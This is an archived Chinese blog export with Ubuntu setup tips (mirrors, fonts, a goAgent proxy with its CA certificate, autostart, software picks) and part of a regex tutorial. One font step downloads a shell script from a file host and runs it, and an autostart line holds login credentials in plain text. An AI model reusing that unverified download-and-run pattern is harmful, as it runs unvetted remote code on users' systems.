restricted#大家可以自己根据自己的版本设置一下，不一定局限于ubuntu 11.04，下面列出一些校内更新源。#电子科技大学deb http://ubuntu.uestc.edu.cn/ubuntu/ natty main restricted universe multiversedeb http://ubuntu.uestc.edu.cn/ubuntu/ natty-backports main restricted universe multiversedeb http://ubuntu.uestc.edu.cn/ubuntu/ natty-proposed main restricted universe multiversedeb http://ubuntu.uestc.edu.cn/ubuntu/ natty-security main restricted universe multiversedeb http://ubuntu.uestc.edu.cn/ubuntu/ natty-updates main restricted universe multiversedeb-src http://ubuntu.uestc.edu.cn/ubuntu/ natty main restricted universe multiversedeb-src http://ubuntu.uestc.edu.cn/ubuntu/ natty-backports main restricted universe multiversedeb-src http://ubuntu.uestc.edu.cn/ubuntu/ natty-proposed main restricted universe multiversedeb-src http://ubuntu.uestc.edu.cn/ubuntu/ natty-security main restricted universe multiversedeb-src http://ubuntu.uestc.edu.cn/ubuntu/ natty-updates main restricted universe multiverse#中国科技大学deb http://debian.ustc.edu.cn/ubuntu/ natty main restricted universe multiversedeb http://debian.ustc.edu.cn/ubuntu/ natty-backports restricted universe multiversedeb http://debian.ustc.edu.cn/ubuntu/ natty-proposed main restricted universe multiversedeb http://debian.ustc.edu.cn/ubuntu/ natty-security main restricted universe multiversedeb http://debian.ustc.edu.cn/ubuntu/ natty-updates main restricted universe multiversedeb-src http://debian.ustc.edu.cn/ubuntu/ natty main restricted universe multiversedeb-src http://debian.ustc.edu.cn/ubuntu/ natty-backports main restricted universe multiversedeb-src http://debian.ustc.edu.cn/ubuntu/ natty-proposed main restricted universe multiversedeb-src http://debian.ustc.edu.cn/ubuntu/ natty-security main restricted universe multiversedeb-src http://debian.ustc.edu.cn/ubuntu/ natty-updates main restricted universe multiverse#北京理工大学deb http://mirror.bjtu.edu.cn/ubuntu/ natty main multiverse restricted universedeb http://mirror.bjtu.edu.cn/ubuntu/ natty-backports main multiverse restricted universedeb http://mirror.bjtu.edu.cn/ubuntu/ natty-proposed main multiverse restricted universedeb http://mirror.bjtu.edu.cn/ubuntu/ natty-security main multiverse restricted universedeb http://mirror.bjtu.edu.cn/ubuntu/ natty-updates main multiverse restricted universedeb-src http://mirror.bjtu.edu.cn/ubuntu/ natty main multiverse restricted universedeb-src http://mirror.bjtu.edu.cn/ubuntu/ natty-backports main multiverse restricted universedeb-src http://mirror.bjtu.edu.cn/ubuntu/ natty-proposed main multiverse restricted universedeb-src http://mirror.bjtu.edu.cn/ubuntu/ natty-security main multiverse restricted universedeb-src http://mirror.bjtu.edu.cn/ubuntu/ natty-updates main multiverse restricted universe#兰州大学deb ftp://mirror.lzu.edu.cn/ubuntu/ natty main multiverse restricted universedeb ftp://mirror.lzu.edu.cn/ubuntu/ natty-backports main multiverse restricted universedeb ftp://mirror.lzu.edu.cn/ubuntu/ natty-proposed main multiverse restricted universedeb ftp://mirror.lzu.edu.cn/ubuntu/ natty-security main multiverse restricted universedeb ftp://mirror.lzu.edu.cn/ubuntu/ natty-updates main multiverse restricted universedeb ftp://mirror.lzu.edu.cn/ubuntu-cn/ natty main multiverse restricted universe#上海交通大学deb http://ftp.sjtu.edu.cn/ubuntu/ natty main multiverse restricted universedeb http://ftp.sjtu.edu.cn/ubuntu/ natty-backports main multiverse restricted universedeb http://ftp.sjtu.edu.cn/ubuntu/ natty-proposed main multiverse restricted universedeb http://ftp.sjtu.edu.cn/ubuntu/ natty-security main multiverse restricted universedeb http://ftp.sjtu.edu.cn/ubuntu/ natty-updates main multiverse restricted universedeb http://ftp.sjtu.edu.cn/ubuntu-cn/ natty main multiverse restricted universedeb-src http://ftp.sjtu.edu.cn/ubuntu/ natty main multiverse restricted universedeb-src http://ftp.sjtu.edu.cn/ubuntu/ natty-backports main multiverse restricted universedeb-src http://ftp.sjtu.edu.cn/ubuntu/ natty-proposed main multiverse restricted universedeb-src http://ftp.sjtu.edu.cn/ubuntu/ natty-security main multiverse restricted universedeb-src http://ftp.sjtu.edu.cn/ubuntu/ natty-updates main multiverse restricted universeView Code &nbsp;2. 字体ubuntu自带的字体文泉字体，边缘很粗糙，不好看 ，我还是比较喜欢微软雅黑。网上随便搜的一个，有兴趣的可以看看： 12345678910111213141516171819202122232425262728293031323334用Ubuntu 系统自带的文泉字体 边缘太模糊 ，所以就上网找了一些更换字体的方法 。跟着做了半天都没成功，后来 发现有个人写了一篇日志 ，编译好了，只需要 按着输入命令就行了 ，下面把方法贴出来http://www.idyj.net/blog/read.php?5支持在Ubuntu8.10、Ubuntu9.04系统上自动安装微软雅黑、monaco-linux、lucida-console等字体。而且可以设置LED、CRT两种不同的显示器的渲染效果，无需手工配置，实现自动化安装。使用方法如下：打开命令控制台，然后运行下面的脚本（可以通过复制下面的内容到命令控制台来执行脚本）：wget -O get-fonts.sh.zip http://files.cnblogs.com/DengYangjun/get-fonts.sh.zipunzip -o get-fonts.sh.zip 1&gt;/dev/nullchmod a+x get-fonts.sh./get-fonts.sh删除下载的字体安装脚本文件：rm get-fonts.sh get-fonts.sh.zip 2&gt;/dev/null注销生效如果觉得不爽，想恢复以前的字体设置：cd /etc/fonts/conf.availsudo mv 51-local.conf.old 51-local.conf 2&gt;/dev/nullsudo mv 69-language-selector-zh-cn.conf.old 69-language-selector-zh-cn.conf 2&gt;/dev/nullsudo rm -f -r /usr/share/fonts/truetype/myfonts 2&gt;/dev/nullcd -修正记录：#1.添加了最新的Windows 7的微软雅黑字体。（附件大小限制，未实现）2.修正了CRT渲染的配置文件的链接错误。3.添加字体：Agency FB4.添加字体设置恢复功能。附注：所有字体文件和安装脚本都通过网络下载，安装速度快慢由你的网络状况决定。View Code 3. 输入法这里为什么要说打字法。相比linux使用者都有一个很大的感触，智能提示太弱，一个原因是没有足够的本地词库，但如果词库加的太多会导致索引速度很慢，显得很卡。如果你是在网页中打字的话，我建议你使用搜狗云输入法或者QQ云输入法，很赞哦~在这里强调输入法的另外一个原因是，wineQQ和ibus输入法有一些兼容性问题，所以，可能你需要另外安装一个输入法。曾经我用的是谷歌输入法，还是不太好用。 4. 翻围墙经常跟google打交道，所以用他的东西也是理所当然的啦，goAgent，网上搜搜这个关键词吧，你肯定行的，步骤有些繁琐，但是一旦弄好了，你一定会爽到爆的！！！多说几句，goAgent的包里面已经包含了&nbsp;SwitchySharp的配置文件，/local/SwitchyOptions.bak弄玩之后记得把证书导入进入，否则你会很蛋疼的～ 证书位置： /local/CA.crt&nbsp;好吧，你不要告诉我，你全部弄好了，但是你不会运行。。 1python ./path/local/proxy.py 为了方便下次使用，写个文件放到桌面，下次双击打开就好。 12345678cd ~/desktopvim proxy.sh//写入python ./path/local/proxy.py//存盘:wq 5. 备份 6. 右键打开终端1）方法一： 1sudo apt-get install nautilus-open-terminal 上面的方法比较直接，安装一个软件辅助就行，但是安装好了之后，需要注销之后才生效，应该可以在命令行里敲个什么代码，刷新当前状态之类的，这个我不是很清楚。2）方法二： 1cd ~/.gnome2/nautilus-scriptssudo gedit open-terminal //此处可以任意命名 将下面代码拷贝进去，ctrl + s保存。 12345678910111213141516171819202122232425262728293031323334353637383940#!/bin/bash## This script opens a gnome-terminal in the directory you select.## Distributed under the terms of GNU GPL version 2 or later## Install in ~/.gnome2/nautilus-scripts or ~/Nautilus/scripts# You need to be running Nautilus 1.0.3+ to use scripts.# When a directory is selected, go there. Otherwise go to current# directory. If more than one directory is selected, show error.if [ -n &quot;$NAUTILUS_SCRIPT_SELECTED_FILE_PATHS&quot; ]; thenset $NAUTILUS_SCRIPT_SELECTED_FILE_PATHSif [ $# -eq 1 ]; thendestination=&quot;$1&quot;# Go to file&apos;s directory if it&apos;s a fileif [ ! -d &quot;$destination&quot; ]; thendestination=&quot;`dirname &quot;$destination&quot;`&quot;fielsezenity --error --title=&quot;Error - Open terminal here&quot; \--text=&quot;You can only select one directory.&quot;exit 1fielsedestination=&quot;`echo &quot;$NAUTILUS_SCRIPT_CURRENT_URI&quot; | sed &apos;s/^file:\/\///&apos;`&quot;fi# It&apos;s only possible to go to local directoriesif [ -n &quot;`echo &quot;$destination&quot; | grep &apos;^[a-zA-Z0-9]\+:&apos;`&quot; ]; thenzenity --error --title=&quot;Error - Open terminal here&quot; \--text=&quot;Only local directories can be used.&quot;exit 1ficd &quot;$destination&quot;exec x-terminal-emulator右键菜单代码 然后修改下这段代码的权限 1chmod +x ./open-terminal 7. 开机自启联网什么的最麻烦里，就希望一劳永逸，配置一次，以后不管里。 1sudo gedit /etc/rc.local 12345//然后开始你的胡作非为mentohust //我们学校最近好像禁用里mentohust，颇为蛋疼//于是就只能用锐捷了./path/rujie.sh -uusername -ppassword -neth0 - sinternet -d0 -S1&lt;start sofeware-name 在打开的文件中添加命令就行。 关于软件 1. 浏览器我比较喜欢用的是chrome，在liunx下叫做chromium，这个东西和google帐号绑定，很多东西转移电脑也能够直接拿到。我不知道chrome在发什么神经，安装好了之后，不停的刷新google首页，键入任何页面都自动reload到google首页。不能忍了！！！！ 刚把chrome卸载，却有发现了解决方案，我次奥！！！所以说，遇到问题还是先到网上搜搜，没准儿能解决！上面问题解决方案：a. 针对13.04版本下Chromium不断刷新网页问题，你在浏览器设置里面禁用掉”启用即搜即得\即可完美解决b. 把网络关掉（自然就不能一直刷新了：），然后打开设置，点开自己的账户，把搜索里的即使搜索关掉就没事了。推荐几款chrome下开发工具： 1） xmarks 从windows到linux，很多收藏的网址就靠这个同步啦～ 2） coloZilla，一款与firefox的rainbow类似的颜色吸取工具，搞前端必备啊！ 3）&nbsp;SwitchySharp， 翻墙靠你了！！！ 4）&nbsp;Quick Note， 轻松作笔记 5）&nbsp;Mobile Tester， 当你弄移动端开发的时候，他可以被成为神器。 6） FVD Video Downloader，&nbsp;神马？网页视频音频弄不下来，这个家伙帮你下载！ 2. 编辑器 1） Vim， &nbsp;看一些朋友，这软件那真是玩的出神入化啊，他们不是在打字，是在高频弹指啊，尼玛，太快鸟！！！着玩意儿要多配置几个插件~ 2） Emacs， 这个也很不错，不过我没用过，下次尝试着用它吧～ 3） &nbsp;Qt， 搞C/C++开发的同学，推荐你用这家伙，集成度高，很给力。 4） sublime text， 个人最喜欢的一款软件，相当喜欢的说！！！无论是windows环境还是linux环境，都大爱sublime，现在都版本3了吧～ http://www.tuicool.com/topics/10100104 3. 图形处理工具GIMP，你懂的。等同于windows下的ps，当然界面略丑陋。 4. QQ&nbsp;wineQQ ，现在版本是2012 beta3版，还行。（兼容性不好）P.S: @LovelyOu&nbsp;说pidgin-lwqq不错，当然如果你对聊天界面没啥要求的话，这个也是个不错的插件~ 只是截图比较麻烦。安装方式： 1sudo add-apt-repository ppa:lainme/pidgin-lwqq sudo apt-get update sudo apt-get install libpurple0 pidgin-lwqq &nbsp;5. 影音&nbsp;VLC media player，这玩意儿不错，但是有两个烦人的点，一是，中文乱码，二是，没有字幕。（下次说解决方案） 6. 截屏通常我用的是shutter，截图功能比较强大。 7. Flashplayer这个在软件中心顺便弄上，chrome看视频，省得麻烦。 一些问题 1. 多个软件同时安装E: 无法获得锁 /var/lib/dpkg/lock - open (11: 资源暂时不可用)E: 无法锁定管理目录(/var/lib/dpkg/)，是否有其他进程正占用它？ &nbsp;比如你的软件中心在安装软件或者更新源，结果你又在命令行里键入sudo apt-get install vim 之类的命令，此时系统是不会响应你的请求的，于是就有了上面这样的报错。 2. 权限问题&nbsp;有的童鞋在网上搜罗里一些软件，结果安装的时候，发现出问题里，安装不了？不要着急，很多情况都是因为权限问题。 12chmod +x /path/filename //+x的意思就是让他可以运行//权限这一块不懂的可以去网速看看，这里不赘述。 3.ubuntu-E:Encountered a section with no Package: header的解决办法 1234终端中输入以下两条命令：sudo rm /var/lib/apt/lists/* -vfsudo apt-get update执行完了命令之后，软件更新器应该会自动要求更新的，搞定。 github 网上看了不少文章，觉得这两篇还算不错。配置：http://blog.csdn.net/lalor/article/details/7830895使用：http://blog.csdn.net/wfdtxz/article/details/7973608推荐：http://my.oschina.net/shipley/blog/98477 前端这一块 1. wamp环境配置，应该是lamp，呵呵。戳我转载的文章，感觉比较不错，放在自己家里。 2. nodeJS 12sudo apt-get install nodejssudo apt-get install npm 比较不喜欢找源码，然后这样做 123./configuremakesudo make install apt-get真心方便~然后尽兴添加你想要的组建 1npm install express 当然，安装好了之后测试下 1nodejs --version 有输出说明是正确的。下面给一串代码，让乃测试 123456789101112var http = require(&quot;http&quot;);function onRequest(request, response) &#123; console.log(&quot;Request received.&quot;); response.writeHead(200, &#123;&quot;Content-Type&quot;: &quot;text/plain&quot;&#125;); response.write(&quot;Hello World&quot;); response.end();&#125;http.createServer(onRequest).listen(8888);console.log(&quot;Server has started.&quot;); 测试代码 &nbsp;笔者感言1. 建议新手还是玩稳定版本，10.04&nbsp; 12.04这些算是经典版本了。 以上基本都是没有补充完善，先把几个记得比较清楚的点列出来，下次有时间，慢慢说～]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则表达式30分钟入门教程]]></title>
    <url>%2Fblog%2F2013%2F06%2F04%2F2013-06-04-cb-RegExp%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 正则表达式30分钟入门教程 目录 本文目标如何使用本教程正则表达式到底是什么东西？入门测试正则表达式元字符字符转义重复字符类分枝条件反义分组后向引用零宽断言负向零宽断言注释贪婪与懒惰处理选项平衡组/递归匹配还有些什么东西没提到 本文目标 30分钟内让你明白正则表达式是什么，并对它有一些基本的了解，让你可以在自己的程序或网页里使用它。 如何使用本教程 最重要的是&mdash;&mdash;请给我30分钟，如果你没有使用正则表达式的经验，请不要试图在30秒内入门&mdash;&mdash;除非你是超人 :)别被下面那些复杂的表达式吓倒，只要跟着我一步一步来，你会发现正则表达式其实并没有你想像中的那么困难。当然，如果你看完了这篇教程之后，发现自己明白了很多，却又几乎什么都记不得，那也是很正常的&mdash;&mdash;我认为，没接触过正则表达式的人在看完这篇教程后，能把提到过的语法记住80%以上的可能性为零。这里只是让你明白基本的原理，以后你还需要多练习，多使用，才能熟练掌握正则表达式。除了作为入门教程之外，本文还试图成为可以在日常工作中使用的正则表达式语法参考手册。就作者本人的经历来说，这个目标还是完成得不错的&mdash;&mdash;你看，我自己也没能把所有的东西记下来，不是吗？清除格式&nbsp;文本格式约定：专业术语&nbsp;元字符/语法格式&nbsp;正则表达式&nbsp;正则表达式中的一部分(用于分析)&nbsp;对其进行匹配的源字符串&nbsp;对正则表达式或其中一部分的说明隐藏边注&nbsp;本文右边有一些注释，主要是用来提供一些相关信息，或者给没有程序员背景的读者解释一些基本概念，通常可以忽略。 正则表达式到底是什么东西？ 字符是计算机软件处理文字时最基本的单位，可能是字母，数字，标点符号，空格，换行符，汉字等等。字符串是0个或更多个字符的序列。文本也就是文字，字符串。说某个字符串匹配某个正则表达式，通常是指这个字符串里有一部分（或几部分分别）能满足表达式给出的条件。在编写处理字符串的程序或网页时，经常会有查找符合某些复杂规则的字符串的需要。正则表达式就是用于描述这些规则的工具。换句话说，正则表达式就是记录文本规则的代码。很可能你使用过Windows/Dos下用于文件查找的通配符(wildcard)，也就是和?。如果你想查找某个目录下的所有的Word文档的话，你会搜索.doc。在这里，*会被解释成任意的字符串。和通配符类似，正则表达式也是用来进行文本匹配的工具，只不过比起通配符，它能更精确地描述你的需求&mdash;&mdash;当然，代价就是更复杂&mdash;&mdash;比如你可以编写一个正则表达式，用来查找所有以0开头，后面跟着2-3个数字，然后是一个连字号-“，最后是7或8位数字的字符串(像010-12345678或0376-7654321)。 入门 学习正则表达式的最好方法是从例子开始，理解例子之后再自己对例子进行修改，实验。下面给出了不少简单的例子，并对它们作了详细的说明。假设你在一篇英文小说里查找hi，你可以使用正则表达式hi。这几乎是最简单的正则表达式了，它可以精确匹配这样的字符串：由两个字符组成，前一个字符是h,后一个是i。通常，处理正则表达式的工具会提供一个忽略大小写的选项，如果选中了这个选项，它可以匹配hi,HI,Hi,hI这四种情况中的任意一种。不幸的是，很多单词里包含hi这两个连续的字符，比如him,history,high等等。用hi来查找的话，这里边的hi也会被找出来。如果要精确地查找hi这个单词的话，我们应该使用\bhi\b。\b是正则表达式规定的一个特殊代码（好吧，某些人叫它元字符，metacharacter），代表着单词的开头或结尾，也就是单词的分界处。虽然通常英文的单词是由空格，标点符号或者换行来分隔的，但是\b并不匹配这些单词分隔字符中的任何一个，它只匹配一个位置。如果需要更精确的说法，\b匹配这样的位置：它的前一个字符和后一个字符不全是(一个是,一个不是或不存在)\w。假如你要找的是hi后面不远处跟着一个Lucy，你应该用\bhi\b.\bLucy\b。这里，.是另一个元字符，匹配除了换行符以外的任意字符。同样是元字符，不过它代表的不是字符，也不是位置，而是数量&mdash;&mdash;它指定前边的内容可以连续重复使用任意次以使整个表达式得到匹配。因此，.连在一起就意味着任意数量的不包含换行的字符。现在\bhi\b.*\bLucy\b的意思就很明显了：先是一个单词hi,然后是任意个任意字符(但不能是换行)，最后是Lucy这个单词。换行符就是’\n’,ASCII编码为10(十六进制0x0A)的字符。如果同时使用其它元字符，我们就能构造出功能更强大的正则表达式。比如下面这个例子：0\d\d-\d\d\d\d\d\d\d\d匹配这样的字符串：以0开头，然后是两个数字，然后是一个连字号-“，最后是8个数字(也就是中国的电话号码。当然，这个例子只能匹配区号为3位的情形)。这里的\d是个新的元字符，匹配一位数字(0，或1，或2，或……)。-不是元字符，只匹配它本身&mdash;&mdash;连字符(或者减号，或者中横线，或者随你怎么称呼它)。为了避免那么多烦人的重复，我们也可以这样写这个表达式：0\d{2}-\d{8}。 这里\d后面的{2}({8})的意思是前面\d必须连续重复匹配2次(8次)。 测试正则表达式 其它可用的测试工具:RegexBuddyJavascript正则表达式在线测试工具如果你不觉得正则表达式很难读写的话，要么你是一个天才，要么，你不是地球人。正则表达式的语法很令人头疼，即使对经常使用它的人来说也是如此。由于难于读写，容易出错，所以找一种工具对正则表达式进行测试是很有必要的。不同的环境下正则表达式的一些细节是不相同的，本教程介绍的是微软 .Net Framework 4.0 下正则表达式的行为，所以，我向你推荐我编写的.Net下的工具 正则表达式测试器。请参考该页面的说明来安装和运行该软件。 元字符 现在你已经知道几个很有用的元字符了，如\b,.,，还有\d.正则表达式里还有更多的元字符，比如\s匹配任意的空白符，包括空格，制表符(Tab)，换行符，中文全角空格等。\w匹配字母或数字或下划线或汉字等。对中文/汉字的特殊处理是由.Net提供的正则表达式引擎支持的，其它环境下的具体情况请查看相关文档。下面来看看更多的例子：\ba\w\b匹配以字母a开头的单词&mdash;&mdash;先是某个单词开始处(\b)，然后是字母a,然后是任意数量的字母或数字(\w)，最后是单词结束处(\b)。好吧，现在我们说说正则表达式里的单词是什么意思吧：就是不少于一个的连续的\w。不错，这与学习英文时要背的成千上万个同名的东西的确关系不大 :)\d+匹配1个或更多连续的数字。这里的+是和类似的元字符，不同的是*匹配重复任意次(可能是0次)，而+则匹配重复1次或更多次。\b\w{6}\b 匹配刚好6个字符的单词。表1.常用的元字符代码说明.匹配除换行符以外的任意字符\w匹配字母或数字或下划线或汉字\s匹配任意的空白符\d匹配数字\b匹配单词的开始或结束^匹配字符串的开始$匹配字符串的结束正则表达式引擎通常会提供一个\测试指定的字符串是否匹配一个正则表达式”的方法，如JavaScript里的RegExp.test()方法或.NET里的Regex.IsMatch()方法。这里的匹配是指是字符串里有没有符合表达式规则的部分。如果不使用^和$的话，对于\d{5,12}而言，使用这样的方法就只能保证字符串里包含5到12连续位数字，而不是整个字符串就是5到12位数字。元字符^（和数字6在同一个键位上的符号）和$都匹配一个位置，这和\b有点类似。^匹配你要用来查找的字符串的开头，$匹配结尾。这两个代码在验证输入的内容时非常有用，比如一个网站如果要求你填写的QQ号必须为5位到12位数字时，可以使用：^\d{5,12}$。这里的{5,12}和前面介绍过的{2}是类似的，只不过{2}匹配只能不多不少重复2次，{5,12}则是重复的次数不能少于5次，不能多于12次，否则都不匹配。因为使用了^和$，所以输入的整个字符串都要用来和\d{5,12}来匹配，也就是说整个输入必须是5到12个数字，因此如果输入的QQ号能匹配这个正则表达式的话，那就符合要求了。和忽略大小写的选项类似，有些正则表达式处理工具还有一个处理多行的选项。如果选中了这个选项，^和$的意义就变成了匹配行的开始处和结束处。 字符转义 如果你想查找元字符本身的话，比如你查找.,或者,就出现了问题：你没办法指定它们，因为它们会被解释成别的意思。这时你就得使用\来取消这些字符的特殊意义。因此，你应该使用.和\。当然，要查找\本身，你也得用\.例如：deerchao.net匹配deerchao.net，C:\Windows匹配C:\Windows。 重复 你已经看过了前面的,+,{2},{5,12}这几个匹配重复的方式了。下面是正则表达式中所有的限定符(指定数量的代码，例如,{5,12}等)：表2.常用的限定符代码/语法说明*重复零次或更多次+重复一次或更多次?重复零次或一次{n}重复n次{n,}重复n次或更多次{n,m}重复n到m次下面是一些使用重复的例子：Windows\d+匹配Windows后面跟1个或更多数字^\w+匹配一行的第一个单词(或整个字符串的第一个单词，具体匹配哪个意思得看选项设置) 字符类 要想查找数字，字母或数字，空白是很简单的，因为已经有了对应这些字符集合的元字符，但是如果你想匹配没有预定义元字符的字符集合(比如元音字母a,e,i,o,u),应该怎么办？很简单，你只需要在方括号里列出它们就行了，像[aeiou]就匹配任何一个英文元音字母，[.?!]匹配标点符号(.或?或!)。我们也可以轻松地指定一个字符范围，像[0-9]代表的含意与\d就是完全一致的：一位数字；同理[a-z0-9A-Z_]也完全等同于\w（如果只考虑英文的话）。下面是一个更复杂的表达式：(?0\d{2}[) -]?\d{8}。(“和)“也是元字符，后面的分组节里会提到，所以在这里需要使用转义。这个表达式可以匹配几种格式的电话号码，像(010)88886666，或022-22334455，或02912345678等。我们对它进行一些分析吧：首先是一个转义字符(,它能出现0次或1次(?),然后是一个0，后面跟着2个数字(\d{2})，然后是)或-或空格中的一个，它出现1次或不出现(?)，最后是8个数字(\d{8})。 分枝条件 不幸的是，刚才那个表达式也能匹配010)12345678或(022-87654321这样的\不正确”的格式。要解决这个问题，我们需要用到分枝条件。正则表达式里的分枝条件指的是有几种规则，如果满足其中任意一种规则都应该当成匹配，具体方法是用|把不同的规则分隔开。听不明白？没关系，看例子：0\d{2}-\d{8}|0\d{3}-\d{7}这个表达式能匹配两种以连字号分隔的电话号码：一种是三位区号，8位本地号(如010-12345678)，一种是4位区号，7位本地号(0376-2233445)。(?0\d{2})?[- ]?\d{8}|0\d{2}[- ]?\d{8}这个表达式匹配3位区号的电话号码，其中区号可以用小括号括起来，也可以不用，区号与本地号间可以用连字号或空格间隔，也可以没有间隔。你可以试试用分枝条件把这个表达式扩展成也支持4位区号的。\d{5}-\d{4}|\d{5}这个表达式用于匹配美国的邮政编码。美国邮编的规则是5位数字，或者用连字号间隔的9位数字。之所以要给出这个例子是因为它能说明一个问题：使用分枝条件时，要注意各个条件的顺序。如果你把它改成\d{5}|\d{5}-\d{4}的话，那么就只会匹配5位的邮编(以及9位邮编的前5位)。原因是匹配分枝条件时，将会从左到右地测试每个条件，如果满足了某个分枝的话，就不会去再管其它的条件了。 分组 我们已经提到了怎么重复单个字符（直接在字符后面加上限定符就行了）；但如果想要重复多个字符又该怎么办？你可以用小括号来指定子表达式(也叫做分组)，然后你就可以指定这个子表达式的重复次数了，你也可以对子表达式进行其它一些操作(后面会有介绍)。(\d{1,3}.){3}\d{1,3}是一个简单的IP地址匹配表达式。要理解这个表达式，请按下列顺序分析它：\d{1,3}匹配1到3位的数字，(\d{1,3}.){3}匹配三位数字加上一个英文句号(这个整体也就是这个分组)重复3次，最后再加上一个一到三位的数字(\d{1,3})。IP地址中每个数字都不能大于255，大家千万不要被《24》第三季的编剧给忽悠了……不幸的是，它也将匹配256.300.888.999这种不可能存在的IP地址。如果能使用算术比较的话，或许能简单地解决这个问题，但是正则表达式中并不提供关于数学的任何功能，所以只能使用冗长的分组，选择，字符类来描述一个正确的IP地址：((2[0-4]\d|25[0-5]|[01]?\d\d?).){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)。理解这个表达式的关键是理解2[0-4]\d|25[0-5]|[01]?\d\d?，这里我就不细说了，你自己应该能分析得出来它的意义。 反义 有时需要查找不属于某个能简单定义的字符类的字符。比如想查找除了数字以外，其它任意字符都行的情况，这时需要用到反义：表3.常用的反义代码代码/语法说明\W匹配任意不是字母，数字，下划线，汉字的字符\S匹配任意不是空白符的字符\D匹配任意非数字的字符\B匹配不是单词开头或结束的位置[^x]匹配除了x以外的任意字符[^aeiou]匹配除了aeiou这几个字母以外的任意字符例子：\S+匹配不包含空白符的字符串。&lt;a[^&gt;]+&gt;匹配用尖括号括起来的以a开头的字符串。 后向引用 使用小括号指定一个子表达式后，匹配这个子表达式的文本(也就是此分组捕获的内容)可以在表达式或其它程序中作进一步的处理。默认情况下，每个分组会自动拥有一个组号，规则是：从左向右，以分组的左括号为标志，第一个出现的分组的组号为1，第二个为2，以此类推。呃……其实,组号分配还不像我刚说得那么简单：分组0对应整个正则表达式实际上组号分配过程是要从左向右扫描两遍的：第一遍只给未命名组分配，第二遍只给命名组分配－－因此所有命名组的组号都大于未命名的组号你可以使用(?:exp)这样的语法来剥夺一个分组对组号分配的参与权．后向引用用于重复搜索前面某个分组匹配的文本。例如，\1代表分组1匹配的文本。难以理解？请看示例：\b(\w+)\b\s+\1\b可以用来匹配重复的单词，像go go, 或者kitty kitty。这个表达式首先是一个单词，也就是单词开始处和结束处之间的多于一个的字母或数字(\b(\w+)\b)，这个单词会被捕获到编号为1的分组中，然后是1个或几个空白符(\s+)，最后是分组1中捕获的内容（也就是前面匹配的那个单词）(\1)。你也可以自己指定子表达式的组名。要指定一个子表达式的组名，请使用这样的语法：(?&lt;Word&gt;\w+)(或者把尖括号换成‘也行：(?’Word’\w+)),这样就把\w+的组名指定为Word了。要反向引用这个分组捕获的内容，你可以使用\k&lt;Word&gt;,所以上一个例子也可以写成这样：\b(?&lt;Word&gt;\w+)\b\s+\k&lt;Word&gt;\b。使用小括号的时候，还有很多特定用途的语法。下面列出了最常用的一些：表4.常用分组语法分类代码/语法说明捕获(exp)匹配exp,并捕获文本到自动命名的组里(?&lt;name&gt;exp)匹配exp,并捕获文本到名称为name的组里，也可以写成(?’name’exp)(?:exp)匹配exp,不捕获匹配的文本，也不给此分组分配组号零宽断言(?=exp)匹配exp前面的位置(?&lt;=exp)匹配exp后面的位置(?!exp)匹配后面跟的不是exp的位置(?&lt;!exp)匹配前面不是exp的位置注释(?#comment)这种类型的分组不对正则表达式的处理产生任何影响，用于提供注释让人阅读我们已经讨论了前两种语法。第三个(?:exp)不会改变正则表达式的处理方式，只是这样的组匹配的内容不会像前两种那样被捕获到某个组里面，也不会拥有组号。\我为什么会想要这样做？”&mdash;&mdash;好问题，你觉得为什么呢？ 零宽断言 地球人，是不是觉得这些术语名称太复杂，太难记了？我也有同感。知道有这么一种东西就行了，它叫什么，随它去吧！人若无名，便可专心练剑；物若无名，便可随意取舍……接下来的四个用于查找在某些内容(但并不包括这些内容)之前或之后的东西，也就是说它们像\b,^,$那样用于指定一个位置，这个位置应该满足一定的条件(即断言)，因此它们也被称为零宽断言。最好还是拿例子来说明吧：断言用来声明一个应该为真的事实。正则表达式中只有当断言为真时才会继续进行匹配。(?=exp)也叫零宽度正预测先行断言，它断言自身出现的位置的后面能匹配表达式exp。比如\b\w+(?=ing\b)，匹配以ing结尾的单词的前面部分(除了ing以外的部分)，如查找I’m singing while you’re dancing.时，它会匹配sing和danc。(?&lt;=exp)也叫零宽度正回顾后发断言，它断言自身出现的位置的前面能匹配表达式exp。比如(?&lt;=\bre)\w+\b会匹配以re开头的单词的后半部分(除了re以外的部分)，例如在查找reading a book时，它匹配ading。假如你想要给一个很长的数字中每三位间加一个逗号(当然是从右边加起了)，你可以这样查找需要在前面和里面添加逗号的部分：((?&lt;=\d)\d{3})+\b，用它对1234567890进行查找时结果是234567890。下面这个例子同时使用了这两种断言：(?&lt;=\s)\d+(?=\s)匹配以空白符间隔的数字(再次强调，不包括这些空白符)。 负向零宽断言 前面我们提到过怎么查找不是某个字符或不在某个字符类里的字符的方法(反义)。但是如果我们只是想要确保某个字符没有出现，但并不想去匹配它时怎么办？例如，如果我们想查找这样的单词–它里面出现了字母q,但是q后面跟的不是字母u,我们可以尝试这样：\b\wq[^u]\w\b匹配包含后面不是字母u的字母q的单词。但是如果多做测试(或者你思维足够敏锐，直接就观察出来了)，你会发现，如果q出现在单词的结尾的话，像Iraq,Benq，这个表达式就会出错。这是因为[^u]总要匹配一个字符，所以如果q是单词的最后一个字符的话，后面的[^u]将会匹配q后面的单词分隔符(可能是空格，或者是句号或其它的什么)，后面的\w\b将会匹配下一个单词，于是\b\wq[^u]\w\b就能匹配整个Iraq fighting。负向零宽断言能解决这样的问题，因为它只匹配一个位置，并不消费任何字符。现在，我们可以这样来解决这个问题：\b\wq(?!u)\w*\b。 